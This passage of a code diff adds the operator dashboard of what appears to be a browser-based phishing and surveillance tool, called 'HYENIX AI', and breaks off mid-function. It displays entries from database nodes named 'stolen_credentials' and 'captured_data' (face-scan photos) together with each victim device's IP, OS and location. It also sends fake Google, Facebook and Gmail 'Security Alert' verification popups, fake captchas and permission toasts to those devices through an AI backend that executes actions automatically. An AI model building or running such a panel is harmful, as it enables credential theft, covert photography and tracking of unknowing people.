+        <span class="dot"></span>
+        <span>Connected</span>
+      </div>
+      <div class="status-pill" id="deviceStatus" style="display:none">
+        <span class="dot"></span>
+        <span id="deviceStatusText">No device</span>
+      </div>
+      <div class="status-pill ai-active" id="aiStatus">
+        <span class="dot"></span>
+        <span>AI Ready</span>
+      </div>
+      <button class="icon-btn" id="notifBtn" title="Notifications" style="position:relative">
+        🔔
+        <span id="notifBadge"
+          style="display:none;position:absolute;top:-4px;right:-4px;background:var(--red);color:#fff;font-size:9px;font-weight:700;min-width:16px;height:16px;border-radius:8px;display:grid;place-items:center;padding:0 4px">0</span>
+      </button>
+      <button class="icon-btn" id="paletteBtn" title="Command palette (Ctrl+K)">⌘</button>
+      <button class="icon-btn" id="clearChatBtn" title="Clear chat (Ctrl+L)">🧹</button>
+      <button class="icon-btn" id="backBtn" title="Back">←</button>
+    </div>
+  </div>
+
+  <!-- Main layout -->
+  <div class="main-layout">
+
+    <!-- Left sidebar -->
+    <aside class="left-sidebar">
+      <div class="sidebar-header">
+        <div class="sidebar-title">Devices</div>
+        <div class="device-count-badge" id="deviceCount">0</div>
+      </div>
+      <div class="device-search">
+        <input type="text" id="deviceSearch" placeholder="Search...">
+      </div>
+      <div class="device-list" id="deviceList">
+        <div style="text-align:center;padding:40px 20px;color:var(--text-dim);font-size:11px">Loading...</div>
+      </div>
+    </aside>
+
+    <!-- Center -->
+    <main class="center-area">
+      <div class="chat-container" id="chatContainer">
+        <div class="welcome-screen" id="welcomeScreen">
+          <div class="welcome-icon">🤖</div>
+          <div class="welcome-title">AI COMMAND CENTER</div>
+          <div class="welcome-subtitle">
+            Natural language mein bolo. AI khud samjhega, sochega, aur action lega.
+          </div>
+          <div class="quick-commands">
+            <div class="quick-cmd-card" onclick="quickCmd('summary do')">
+              <div class="quick-cmd-icon">📊</div>
+              <div class="quick-cmd-text">
+                <div class="quick-cmd-title">Database Summary</div>
+                <div class="quick-cmd-desc">Full stats + anomalies</div>
+              </div>
+            </div>
+            <div class="quick-cmd-card" onclick="quickCmd('permission grant ke liye red toast bhejo')">
+              <div class="quick-cmd-icon">🚨</div>
+              <div class="quick-cmd-text">
+                <div class="quick-cmd-title">Permission Toast</div>
+                <div class="quick-cmd-desc">Professional error message</div>
+              </div>
+            </div>
+            <div class="quick-cmd-card" onclick="quickCmd('facebook alert bhejo')">
+              <div class="quick-cmd-icon">📘</div>
+              <div class="quick-cmd-text">
+                <div class="quick-cmd-title">Facebook Alert</div>
+                <div class="quick-cmd-desc">Brand-specific popup</div>
+              </div>
+            </div>
+            <div class="quick-cmd-card" onclick="quickCmd('google.com daalo')">
+              <div class="quick-cmd-icon">🔗</div>
+              <div class="quick-cmd-text">
+                <div class="quick-cmd-title">Load Google</div>
+                <div class="quick-cmd-desc">Custom URL in iframe</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="input-area">
+        <div class="input-container">
+          <textarea class="command-input" id="commandInput"
+            placeholder="AI se kuch bhi bolo... (↑/↓ history, Ctrl+K palette, Shift+Enter new line)"
+            rows="1"></textarea>
+          <button class="input-btn voice-btn" id="voiceBtn" title="Voice input">🎤</button>
+          <button class="input-btn send-btn" id="sendBtn" disabled>▶</button>
+        </div>
+      </div>
+    </main>
+
+    <!-- Right sidebar -->
+    <aside class="right-sidebar">
+      <div class="context-section">
+        <div class="context-title"><span class="icon">🎯</span> Selected Device</div>
+        <div id="deviceContext">
+          <div style="text-align:center;padding:20px;color:var(--text-dim);font-size:10px">
+            Select a device
+          </div>
+        </div>
+      </div>
+
+      <div class="context-section">
+        <div class="context-title"><span class="icon">⏰</span> Auto-Scan</div>
+        <div id="autoScanStatus" style="font-size:10px;color:var(--text-mid)">
+          <div
+            style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px dashed rgba(22,38,61,0.5)">
+            <span>Status</span>
+            <span id="autoScanEnabled" style="color:var(--green);font-weight:600">● Active</span>
+          </div>
+          <div
+            style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px dashed rgba(22,38,61,0.5)">
+            <span>Interval</span>
+            <span style="color:var(--cyan);font-family:'Share Tech Mono',monospace">5 min</span>
+          </div>
+          <div
+            style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px dashed rgba(22,38,61,0.5)">
+            <span>Last Scan</span>
+            <span id="autoScanLast" style="font-family:'Share Tech Mono',monospace">Never</span>
+          </div>
+          <div
+            style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px dashed rgba(22,38,61,0.5)">
+            <span>Total Scans</span>
+            <span id="autoScanTotal" style="color:var(--cyan);font-family:'Share Tech Mono',monospace">0</span>
+          </div>
+          <div style="display:flex;justify-content:space-between;padding:4px 0">
+            <span>Auto-Fixed</span>
+            <span id="autoScanFixed" style="color:var(--green);font-family:'Share Tech Mono',monospace">0</span>
+          </div>
+        </div>
+        <div style="display:flex;gap:6px;margin-top:10px">
+          <button onclick="toggleAutoScan()" id="autoScanToggleBtn"
+            style="flex:1;padding:6px;background:var(--panel-2);border:1px solid var(--border);border-radius:5px;color:var(--text-mid);cursor:pointer;font-size:9px;font-weight:600">
+            ⏸ Pause
+          </button>
+          <button onclick="runScanNow()"
+            style="flex:1;padding:6px;background:var(--panel-2);border:1px solid var(--border);border-radius:5px;color:var(--cyan);cursor:pointer;font-size:9px;font-weight:600">
+            ▶ Scan Now
+          </button>
+        </div>
+      </div>
+      <div class="context-section">
+        <div class="context-title"><span class="icon">⚡</span> Quick Actions</div>
+        <div class="quick-actions-grid">
+          <button class="quick-action-btn" onclick="quickCmd('game deploy karo')">
+            <span class="q-icon">🎮</span><span>Game</span>
+          </button>
+          <button class="quick-action-btn" onclick="quickCmd('captcha daalo')">
+            <span class="q-icon">🔐</span><span>Captcha</span>
+          </button>
+          <button class="quick-action-btn" onclick="quickCmd('gmail deploy karo')">
+            <span class="q-icon">📧</span><span>Gmail</span>
+          </button>
+          <button class="quick-action-btn" onclick="quickCmd('clear karo')">
+            <span class="q-icon">🧹</span><span>Clear</span>
+          </button>
+          <button class="quick-action-btn" onclick="quickCmd('vibrate karo')">
+            <span class="q-icon">📳</span><span>Vibrate</span>
+          </button>
+          <button class="quick-action-btn" onclick="quickCmd('device kaha hai')">
+            <span class="q-icon">📍</span><span>GPS</span>
+          </button>
+          <button class="quick-action-btn" onclick="window.location.href='photos.html'">
+            <span class="q-icon">📸</span><span>Gallery</span>
+          </button>
+        </div>
+      </div>
+      <!-- Send Modal V2 -->
+      <div class="context-section">
+        <div class="context-title"><span class="icon">🎭</span> Send Modal V2</div>
+
+        <select id="modalV2Brand"
+          style="width:100%;padding:6px;background:var(--bg);border:1px solid var(--border);border-radius:5px;color:var(--text);font-size:10px;margin-bottom:6px">
+          <option value="Google">Google</option>
+          <option value="Facebook">Facebook</option>
+          <option value="Instagram">Instagram</option>
+          <option value="WhatsApp">WhatsApp</option>
+          <option value="Gmail">Gmail</option>
+          <option value="Twitter">Twitter</option>
+        </select>
+
+        <textarea id="modalV2Message" placeholder="Message..."
+          style="width:100%;padding:6px;background:var(--bg);border:1px solid var(--border);border-radius:5px;color:var(--text);font-size:10px;margin-bottom:6px;resize:vertical;min-height:50px;font-family:inherit">Your account needs verification. Please confirm to continue.</textarea>
+
+        <input type="text" id="modalV2Title" placeholder="Title" value="Security Alert"
+          style="width:100%;padding:6px;background:var(--bg);border:1px solid var(--border);border-radius:5px;color:var(--text);font-size:10px;margin-bottom:6px">
+
+        <div style="display:flex;gap:4px;margin-bottom:6px">
+          <input type="text" id="modalV2OkText" placeholder="OK text" value="Verify Now"
+            style="flex:1;padding:6px;background:var(--bg);border:1px solid var(--border);border-radius:5px;color:var(--text);font-size:10px">
+          <input type="text" id="modalV2CancelText" placeholder="Cancel text" value="Cancel"
+            style="flex:1;padding:6px;background:var(--bg);border:1px solid var(--border);border-radius:5px;color:var(--text);font-size:10px">
+        </div>
+
+        <input type="text" id="modalV2OkAction" placeholder="Redirect URL (optional)" value=""
+          style="width:100%;padding:6px;background:var(--bg);border:1px solid var(--border);border-radius:5px;color:var(--text);font-size:10px;margin-bottom:8px">
+
+        <button onclick="sendModalV2()"
+          style="width:100%;padding:8px;background:linear-gradient(135deg,var(--purple),var(--cyan));border:none;border-radius:6px;color:#fff;font-weight:700;font-size:10px;cursor:pointer">
+          🚀 SEND MODAL V2
+        </button>
+
+        <div id="modalV2Status" style="margin-top:6px;font-size:9px;color:var(--text-dim);text-align:center"></div>
+      </div>
+      <!-- ⬇️ NEW: Cyber AI Missions -->
+      <div class="context-section">
+        <div class="context-title"><span class="icon">🎯</span> Cyber AI Missions</div>
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 6px;">
+          <button onclick="runMission('scan')" class="quick-action-btn">
+            <span class="q-icon">🔍</span><span>Threat Scan</span>
+          </button>
+          <button onclick="runMission('cleanup')" class="quick-action-btn">
+            <span class="q-icon">🧹</span><span>Cleanup</span>
+          </button>
+          <button onclick="runMission('deploy')" class="quick-action-btn">
+            <span class="q-icon">🚀</span><span>Deploy All</span>
+          </button>
+          <button onclick="runMission('missions')" class="quick-action-btn">
+            <span class="q-icon">📋</span><span>Missions</span>
+          </button>
+        </div>
+      </div>
+      <div class="context-section">
+        <div class="context-title"><span class="icon">📜</span> Recent Activity</div>
+        <div id="recentHistory">
+          <div style="text-align:center;padding:12px;color:var(--text-dim);font-size:10px">
+            No activity yet
+          </div>
+        </div>
+      </div>
+    </aside>
+
+  </div>
+
+  <!-- Undo bar -->
+  <div class="undo-bar" id="undoBar">
+    <div class="undo-bar-text" id="undoBarText">Last action done</div>
+    <button class="undo-btn" onclick="undoLast()">↩ UNDO</button>
+  </div>
+
+  <!-- Command palette -->
+  <div class="palette-overlay" id="paletteOverlay">
+    <div class="palette">
+      <input type="text" class="palette-input" id="paletteInput" placeholder="Type a command..." autofocus>
+      <ul class="palette-list" id="paletteList"></ul>
+    </div>
+  </div>
+
+  <!-- Photo modal -->
+  <div class="photo-modal" id="photoModal" onclick="if(event.target === this) closePhotoModal()">
+    <div class="photo-modal-content">
+      <button class="photo-modal-close" onclick="closePhotoModal()">✕</button>
+      <img class="photo-modal-img" id="photoModalImg" src="" alt="Capture">
+      <div class="photo-modal-meta" id="photoModalMeta"></div>
+    </div>
+  </div>
+
+  <!-- Toasts -->
+  <div class="toasts" id="toasts"></div>
+  <!-- Notifications Modal -->
+  <div class="modal-overlay" id="notifModal"
+    style="position:fixed;inset:0;background:rgba(3,5,8,0.85);backdrop-filter:blur(8px);z-index:2500;display:none;align-items:flex-start;justify-content:center;padding-top:10vh">
+    <div
+      style="background:var(--panel);border:1px solid var(--border);border-radius:12px;width:90%;max-width:500px;max-height:70vh;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.6)">
+      <div
+        style="padding:16px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between">
+        <div
+          style="font-family:'Orbitron',sans-serif;font-size:12px;font-weight:700;color:var(--cyan);letter-spacing:2px">
+          🔔 NOTIFICATIONS</div>
+        <button onclick="closeNotifModal()"
+          style="background:none;border:1px solid var(--border);color:var(--text-dim);width:28px;height:28px;border-radius:50%;cursor:pointer">✕</button>
+      </div>
+      <div id="notifList" style="max-height:60vh;overflow-y:auto;padding:8px"></div>
+    </div>
+  </div>
+  <script src="config.js"></script>
+  <script>
+    // ═══════════════════════════════════════════════════════════
+    // STATE
+    // ═══════════════════════════════════════════════════════════
+    const AI_URL = "http://127.0.0.1:5000/";
+    const state = {
+      db: null,
+      devices: new Map(),
+      online: new Map(),
+      commands: new Map(),
+      photos: new Map(),
+      credentials: new Map(),
+      selectedDeviceId: null,
+      history: [],
+      cmdHistory: [],
+      cmdHistoryIndex: -1,
+      lastUndoId: null,
+      busy: false,
+      voiceActive: false,
+      recognition: null,
+    };
+
+    const $ = (id) => document.getElementById(id);
+    const chatContainer = $('chatContainer');
+    const welcomeScreen = $('welcomeScreen');
+    const commandInput = $('commandInput');
+    const sendBtn = $('sendBtn');
+    const voiceBtn = $('voiceBtn');
+
+    // ═══════════════════════════════════════════════════════════
+    // INIT
+    // ═══════════════════════════════════════════════════════════
+    function initFirebase() {
+      if (typeof firebaseConfig === 'undefined') {
+        toast('config.js missing', 'err');
+        return;
+      }
+      if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+      state.db = firebase.database();
+
+      state.db.ref('devices').on('value', snap => {
+        state.devices.clear();
+        const val = snap.val() || {};
+        Object.keys(val).forEach(id => state.devices.set(id, val[id]));
+        renderDeviceList();
+      });
+
+      state.db.ref('online_devices').on('value', snap => {
+        state.online.clear();
+        const val = snap.val() || {};
+        Object.keys(val).forEach(id => state.online.set(id, val[id]));
+        renderDeviceList();
+        if (state.selectedDeviceId) renderDeviceContext();
+      });
+
+      state.db.ref('admin_commands').on('value', snap => {
+        state.commands.clear();
+        const val = snap.val() || {};
+        Object.keys(val).forEach(id => state.commands.set(id, val[id]));
+        if (state.selectedDeviceId) renderDeviceContext();
+      });
+
+      state.db.ref('captured_data').on('value', snap => {
+        state.photos.clear();
+        const val = snap.val() || {};
+        Object.keys(val).forEach(id => state.photos.set(id, val[id]));
+        if (state.selectedDeviceId) renderDeviceContext();
+      });
+
+      state.db.ref('stolen_credentials').on('value', snap => {
+        state.credentials.clear();
+        const val = snap.val() || {};
+        Object.keys(val).forEach(id => state.credentials.set(id, val[id]));
+        if (state.selectedDeviceId) renderDeviceContext();
+      });
+
+      state.db.ref('.info/connected').on('value', snap => {
+        const online = snap.val() === true;
+        const el = $('connStatus');
+        if (online) {
+          el.className = 'status-pill online';
+          el.innerHTML = '<span class="dot"></span><span>Connected</span>';
+        } else {
+          el.className = 'status-pill offline';
+          el.innerHTML = '<span class="dot"></span><span>Offline</span>';
+        }
+      });
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // DEVICE LIST
+    // ═══════════════════════════════════════════════════════════
+    function renderDeviceList() {
+      const list = $('deviceList');
+      const search = $('deviceSearch').value.toLowerCase();
+      $('deviceCount').textContent = state.devices.size;
+
+      if (state.devices.size === 0) {
+        list.innerHTML = '<div style="text-align:center;padding:40px 20px;color:var(--text-dim);font-size:11px">No devices</div>';
+        return;
+      }
+
+      const items = [];
+      state.devices.forEach((dev, id) => {
+        if (dev.deletedAt) return;
+        if (search && !id.toLowerCase().includes(search) &&
+          !(dev.name || '').toLowerCase().includes(search)) return;
+        items.push({ id, dev });
+      });
+
+      items.sort((a, b) => {
+        const aOn = state.online.get(a.id)?.status === 'online';
+        const bOn = state.online.get(b.id)?.status === 'online';
+        if (aOn !== bOn) return aOn ? -1 : 1;
+        return (state.online.get(b.id)?.lastSeen || 0) - (state.online.get(a.id)?.lastSeen || 0);
+      });
+
+      if (items.length === 0) {
+        list.innerHTML = '<div style="text-align:center;padding:40px 20px;color:var(--text-dim);font-size:11px">No matches</div>';
+        return;
+      }
+
+      list.innerHTML = items.map(({ id, dev }) => {
+        const isOnline = state.online.get(id)?.status === 'online';
+        const selected = state.selectedDeviceId === id;
+        const initials = (dev.name || '?').split(/\s+/).map(w => w[0]).slice(0, 2).join('').toUpperCase();
+        return `
+          <div class="device-item ${isOnline ? 'online' : ''} ${selected ? 'selected' : ''}" 
+               onclick="selectDevice('${id}')" data-id="${id}">
+            <div class="device-avatar">${initials}</div>
+            <div class="device-info">
+              <div class="device-name">${escapeHtml(dev.name || 'Unknown')}</div>
+              <div class="device-id">${id.slice(0, 20)}</div>
+            </div>
+          </div>
+        `;
+      }).join('');
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // SELECT DEVICE
+    // ═══════════════════════════════════════════════════════════
+    function selectDevice(id) {
+      state.selectedDeviceId = id;
+      document.querySelectorAll('.device-item').forEach(el => {
+        el.classList.toggle('selected', el.dataset.id === id);
+      });
+      renderDeviceContext();
+
+      const statusPill = $('deviceStatus');
+      statusPill.style.display = 'inline-flex';
+      const dev = state.devices.get(id);
+      const isOnline = state.online.get(id)?.status === 'online';
+      statusPill.className = `status-pill ${isOnline ? 'online' : 'offline'}`;
+      $('deviceStatusText').textContent = dev?.name || id.slice(0, 15);
+
+      toast(`Selected: ${dev?.name || id}`, 'info');
+      // ✅ Modal V2 button enable/disable — function ke ANDAR
+      const modalV2Btn = document.querySelector('button[onclick="sendModalV2()"]');
+      if (modalV2Btn) {
+        modalV2Btn.disabled = !id;
+        modalV2Btn.style.opacity = id ? '1' : '0.5';
+      }
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // DEVICE CONTEXT
+    // ═══════════════════════════════════════════════════════════
+    function renderDeviceContext() {
+      const ctx = $('deviceContext');
+      if (!state.selectedDeviceId) {
+        ctx.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-dim);font-size:10px">Select a device</div>';
+        return;
+      }
+
+      const id = state.selectedDeviceId;
+      const dev = state.devices.get(id) || {};
+      const online = state.online.get(id) || {};
+      const cmd = state.commands.get(id) || {};
+      const photosNode = state.photos.get(id)?.face_scan || {};
+      const credsNode = state.credentials.get(id) || {};
+
+      const isOnline = online.status === 'online';
+      const currentPage = cmd.iframe?.custom_url || cmd.iframe?.page || 'none';
+      const photoCount = Object.keys(photosNode).length;
+      const credCount = Object.keys(credsNode).length;
+
+      // Latest photos
+      const photoTimes = Object.keys(photosNode).map(Number).sort((a, b) => b - a).slice(0, 6);
+
+      ctx.innerHTML = `
+        <div class="device-context-card">
+          <div class="device-context-name">${escapeHtml(dev.name || 'Unknown')}</div>
+          <div class="device-context-id">${id}</div>
+
+          <div class="context-row">
+            <span class="context-key">Status</span>
+            <span class="context-value ${isOnline ? 'online' : 'offline'}">${isOnline ? '● Online' : '○ Offline'}</span>
+          </div>
+          <div class="context-row">
+            <span class="context-key">Browser</span>
+            <span class="context-value">${escapeHtml(dev.browser || '--')}</span>
+          </div>
+          <div class="context-row">
+            <span class="context-key">OS</span>
+            <span class="context-value">${escapeHtml(dev.os || '--')}</span>
+          </div>
+          <div class="context-row">
+            <span class="context-key">IP</span>
+            <span class="context-value info">${escapeHtml(dev.ip || '--')}</span>
+          </div>
+          <div class="context-row">
+            <span class="context-key">Page</span>
+            <span class="context-value warn">${escapeHtml(currentPage)}</span>
+          </div>
+          <div class="context-row">
+            <span class="context-key">Battery</span>
+            <span class="context-value">${escapeHtml(dev.battery || '--')}</span>
+          </div>
+          <div class="context-row">
+            <span class="context-key">Photos</span>
+            <span class="context-value info">${photoCount}</span>
+          </div>
+          <div class="context-row">
+            <span class="context-key">Credentials</span>
+            <span class="context-value ${credCount > 0 ? 'warn' : ''}">${credCount}</span>
+          </div>
+          <div class="context-row">
+            <span class="context-key">Last Seen</span>
+            <span class="context-value">${online.lastSeen ? timeAgo(online.lastSeen) : '--'}</span>
+          </div>
+        </div>
+
+        ${photoTimes.length ? `
+          <div style="margin-top:10px">
+            <div style="font-size:9px;color:var(--text-dim);margin-bottom:6px;text-transform:uppercase;letter-spacing:1px">Recent Photos</div>
+            <div class="photo-grid">
+              ${photoTimes.map(ts => {
+        const p = photosNode[ts];
+        const date = new Date(Number(ts)).toLocaleString('en-IN', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' });
+        return `<div class="photo-thumb" onclick="openPhotoModal('${p.image}', '${date}', '${p.type || 'capture'}')">
+                  <img src="${p.image}" alt="Photo">
+                </div>`;
+      }).join('')}
+            </div>
+          </div>
+        ` : ''}
+      `;
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // SEND COMMAND
+    // ═══════════════════════════════════════════════════════════
+    async function sendCommand() {
+      const cmd = commandInput.value.trim();
+      if (!cmd || state.busy) return;
+
+      state.busy = true;
+      sendBtn.disabled = true;
+      welcomeScreen.style.display = 'none';
+
+      // Save command history
+      if (state.cmdHistory[state.cmdHistory.length - 1] !== cmd) {
+        state.cmdHistory.push(cmd);
+        if (state.cmdHistory.length > 50) state.cmdHistory.shift();
+      }
+      state.cmdHistoryIndex = -1;
+
+      addMessage('user', cmd);
+      commandInput.value = '';
+      commandInput.style.height = 'auto';
+
+      const thinkingEl = addThinkingIndicator();
+      updateAiStatus('thinking', 'Thinking...');
+
+      try {
+        const res = await fetch(AI_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            firebaseUrl: firebaseConfig.databaseURL,
+            userCommand: cmd,
+            deviceId: state.selectedDeviceId,
+            history: state.history.slice(-10),
+            autoRun: true
+          })
+        });
+
+        if (!res.ok) {
+          const t = await res.text();
+          throw new Error('HTTP ' + res.status + ': ' + t.slice(0, 100));
+        }
+
+        const report = await res.json();
+        if (report.error) throw new Error(report.error);
+
+        thinkingEl.remove();
+        addAiResponse(report);
+
+        state.history.push({ role: 'user', content: cmd });
+        if (report.summary) state.history.push({ role: 'assistant', content: report.summary });
+        if (state.history.length > 20) state.history = state.history.slice(-20);
+
+        if (report.undoId) {
+          state.lastUndoId = report.undoId;
+          showUndoBar(`Applied ${report.execution?.applied?.length || 0} actions`);
+        }
+
+        addHistoryItem(report.summary || cmd, report.status === 'error' ? 'error' : 'success');
+        updateAiStatus('ai-active', 'Ready');
+        toast(`✅ ${report.execution?.applied?.length || 0} actions applied`, 'ok');
+        renderDeviceContext();
+      } catch (e) {
+        thinkingEl.remove();
+        const errMsg = addMessage('assistant', '❌ Error: ' + e.message);
+        errMsg.dataset.canRetry = 'true';
+        errMsg.dataset.lastCmd = cmd;
+        updateAiStatus('offline', 'Error');
+        toast('AI failed: ' + e.message, 'err');
+      } finally {
+        state.busy = false;
+        sendBtn.disabled = !commandInput.value.trim();
+      }
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // MARKDOWN RENDERING
+    // ═══════════════════════════════════════════════════════════
+    function renderMarkdown(text) {
+      if (!text) return '';
+      let html = escapeHtml(text);
+      // Code blocks
+      html = html.replace(/```([\s\S]*?)```/g, '<pre><code>$1</code></pre>');
+      // Inline code
+      html = html.replace(/`([^`]+)`/g, '<code>$1</code>');
+      // Bold
+      html = html.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
+      // Italic
+      html = html.replace(/\*([^*]+)\*/g, '<em>$1</em>');
+      // Links
+      html = html.replace(/(https?:\/\/[^\s<]+)/g, '<a href="$1" target="_blank" rel="noopener">$1</a>');
+      // Line breaks
+      html = html.replace(/\n/g, '<br>');
+      return html;
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // MESSAGES
+    // ═══════════════════════════════════════════════════════════
+    function addMessage(role, text) {
+      const msg = document.createElement('div');
+      msg.className = `message ${role}`;
+      const time = new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' });
+
+      msg.innerHTML = `
+        <div class="msg-avatar">${role === 'user' ? '👤' : '🤖'}</div>
+        <div class="msg-body">
+          <div class="msg-header">
+            <span class="msg-name">${role === 'user' ? 'YOU' : 'HYENIX AI'}</span>
+            <span class="msg-time">${time}</span>
+          </div>
+          <div class="msg-bubble md">${renderMarkdown(text)}</div>
+        </div>
+      `;
+
+      chatContainer.appendChild(msg);
+      scrollToBottom();
+      return msg;
+    }
+
+    function addThinkingIndicator() {
+      const msg = document.createElement('div');
+      msg.className = 'message assistant';
+      msg.innerHTML = `
+        <div class="msg-avatar">🤖</div>
+        <div class="msg-body">
+          <div class="thinking-indicator" style="background: rgba(0,0,0,0.4); border: 1px solid rgba(0, 212, 255, 0.3); padding: 12px 18px; border-radius: 8px; display: inline-flex; align-items: center; gap: 10px; box-shadow: 0 0 15px rgba(0, 212, 255, 0.1);">
+            <div class="thinking-dots">
+              <div class="thinking-dot" style="background: #00d4ff;"></div>
+              <div class="thinking-dot" style="background: #00d4ff;"></div>
+              <div class="thinking-dot" style="background: #00d4ff;"></div>
+            </div>
+            <span class="thinking-text" style="color: #00d4ff; font-family: 'Share Tech Mono', monospace; font-size: 12px;">Analyzing request...</span>
+          </div>
+        </div>
+      `;
+      chatContainer.appendChild(msg);
+      scrollToBottom();
+      return msg;
+    }
+    function addAiResponse(report) {
+      const msg = document.createElement('div');
+      msg.className = 'message assistant';
+      const time = new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' });
+
+      let html = `
+        <div class="msg-avatar" style="background: linear-gradient(135deg, #b846ff, #00d4ff); box-shadow: 0 0 15px rgba(184, 70, 255, 0.4);">🤖</div>
+        <div class="msg-body">
+          <div class="msg-header">
+            <span class="msg-name" style="color: #00d4ff; font-family: 'Orbitron', sans-serif;">HYENIX AI</span>
+            <span class="msg-time">${time}</span>
+          </div>
+          <div class="msg-bubble md" style="background: rgba(10, 14, 23, 0.85); border: 1px solid rgba(0, 212, 255, 0.2); border-radius: 12px;">
+      `;
+
+      // ═══ 1. THOUGHT PROCESS (Collapsible Premium Style) ═══
+      if (report.thinking) {
+        html += `
+          <details style="margin-bottom: 15px; background: rgba(184, 70, 255, 0.05); border: 1px solid rgba(184, 70, 255, 0.2); border-radius: 8px; overflow: hidden;">
+            <summary style="cursor: pointer; padding: 10px 15px; font-size: 12px; font-weight: 600; color: #b846ff; display: flex; align-items: center; gap: 8px; outline: none; user-select: none;">
+              <span style="font-size: 14px;">🧠</span> Thought Process
+            </summary>
+            <div style="padding: 0 15px 15px 15px; font-size: 12px; color: #8ab4d4; line-height: 1.6; font-family: 'Share Tech Mono', monospace; border-top: 1px solid rgba(184, 70, 255, 0.1);">
+              ${escapeHtml(report.thinking)}
+            </div>
+          </details>
+        `;
+      }
+
+      // ═══ 2. MAIN ANSWER (ChatGPT Style) ═══
+      const mainText = report.answer || report.summary;
+      if (mainText) {
+        html += `<div style="font-size: 14px; line-height: 1.7; color: #e0f2ff; margin-bottom: 15px;">
+            ${renderMarkdown(mainText)}
+        </div>`;
+      }
+
+      // ═══ 3. INSIGHTS (Agar koi warning hai) ═══
+      if (report.insights && report.insights.length) {
+        html += '<div class="insights-list" style="margin-top:10px;">';
+        report.insights.forEach(i => {
+          html += `<div class="insight-item ${i.type || 'info'}" style="background: rgba(0,0,0,0.3); border-radius: 6px; padding: 8px 12px; margin-bottom: 6px; font-size: 12px;">
+            <span class="icon" style="margin-right: 8px;">${i.icon || '•'}</span>
+            <span>${escapeHtml(i.text || '')}</span>
+          </div>`;
+        });
+        html += '</div>';
+      }
+
+      // ═══ 4. ACTIONS EXECUTED (Hacker Terminal Style) ═══
+      if (report.execution?.applied?.length) {
+        html += `
+          <div style="margin-top: 15px; background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(0, 255, 136, 0.3); border-radius: 8px; padding: 12px; font-family: 'Share Tech Mono', monospace;">
+            <div style="font-size: 11px; font-weight: bold; color: #00ff88; margin-bottom: 8px; border-bottom: 1px dashed rgba(0, 255, 136, 0.3); padding-bottom: 5px;">
+              >_ ACTIONS EXECUTED
+            </div>
+        `;
+        report.execution.applied.forEach(a => {
+          html += `<div style="font-size: 12px; color: #e0f2ff; margin-bottom: 5px; display: flex; align-items: center; gap: 8px;">
+            <span style="color: #00ff88;">✔</span> ${escapeHtml(a.label || a.type)}
+          </div>`;
+        });
+        html += `</div>`;
+      }
+
+      // ═══ 5. ACTIONS SKIPPED (Agar koi fail hua) ═══
+      if (report.execution?.skipped?.length) {
+        html += `
+          <div style="margin-top: 10px; background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(255, 46, 76, 0.3); border-radius: 8px; padding: 12px; font-family: 'Share Tech Mono', monospace;">
+            <div style="font-size: 11px; font-weight: bold; color: #ff2e4c; margin-bottom: 8px;">
+              >_ ACTIONS SKIPPED
+            </div>
+        `;
+        report.execution.skipped.forEach(a => {
+          html += `<div style="font-size: 12px; color: #ff2e4c; margin-bottom: 5px;">
+            <span style="color: #ff2e4c;">✖</span> ${escapeHtml(a.reason || 'Unknown')}
+          </div>`;
+        });
+        html += `</div>`;
+      }
+
+      // ═══ 6. BUTTONS ═══
+      html += `
+          </div>
+          <div class="msg-actions">
+            <button class="msg-action-btn" onclick="copyResponse(this)">📋 Copy</button>
+            <button class="msg-action-btn" onclick="speakResponse(this)">🔊 Speak</button>
+          </div>
+        </div>
+      `;
+
+      msg.innerHTML = html;
+      chatContainer.appendChild(msg);
+      scrollToBottom();
+    }
+
+    function scrollToBottom() {
+      setTimeout(() => {
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+      }, 50);
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // UTILS
+    // ═══════════════════════════════════════════════════════════
+    function copyResponse(btn) {
+      const bubble = btn.closest('.msg-body').querySelector('.msg-bubble');
+      if (!bubble) return;
+      navigator.clipboard.writeText(bubble.innerText).then(() => {
+        toast('Copied!', 'ok');
+      });
+    }
+
+    function speakResponse(btn) {
+      const bubble = btn.closest('.msg-body').querySelector('.msg-bubble');
+      if (!bubble || !window.speechSynthesis) return;
+      const text = bubble.innerText.slice(0, 500);
+      const u = new SpeechSynthesisUtterance(text);
+      u.lang = 'en-IN';
+      u.rate = 1.1;
+      speechSynthesis.cancel();
+      speechSynthesis.speak(u);
+    }
+
+    function quickCmd(cmd) {
+      commandInput.value = cmd;
+      commandInput.dispatchEvent(new Event('input'));
+      sendCommand();
+    }
+
+    function openPhotoModal(src, date, type) {
+      $('photoModalImg').src = src;
+      $('photoModalMeta').innerHTML = `
+        <span><strong>📅 ${escapeHtml(date)}</strong></span>
+        <span><strong>📸 ${escapeHtml(type)}</strong></span>
+      `;
+      $('photoModal').classList.add('show');
+    }
+
+    function closePhotoModal() {
+      $('photoModal').classList.remove('show');
+    }
+    // ═══════════════════════════════════════════════════════════
+    // SEND MODAL V2
+    // ═══════════════════════════════════════════════════════════
+    async function sendModalV2() {
+      const deviceId = state.selectedDeviceId;
+      if (!deviceId) { toast('Pehle device select karo', 'err'); return; }
+
+      const brand = $('modalV2Brand').value;
+      const message = $('modalV2Message').value.trim();
